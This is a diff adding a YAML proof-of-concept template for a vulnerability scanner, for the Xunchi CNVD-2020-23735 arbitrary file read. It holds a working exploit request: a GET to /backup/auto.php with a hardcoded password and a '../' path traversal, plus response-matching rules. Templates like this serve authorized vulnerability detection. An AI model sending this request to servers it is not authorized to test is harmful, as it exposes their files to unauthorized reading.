@@ -1,0 +1,21 @@
+detail:
+  author: "\u6E05\u98CE\u660E\u6708(www.secbook.info)"
+  influence_version: ' >= V2.3'
+  links:
+  - http://www.cnxunchi.com
+  - https://www.cnvd.org.cn/flaw/show/2025171
+expression: r0()
+manual: true
+name: poc-yaml-xunchi-cnvd-2020-23735-file-read
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes(string("NzbwpQSdbY06Dngnoteo2wdgiekm7j4N")))
+      && response.body.bcontains(bytes(string("display_errors")))
+    request:
+      cache: true
+      follow_redirects: false
+      headers:
+        Accept-Encoding: deflate
+      method: GET
+      path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+transport: http
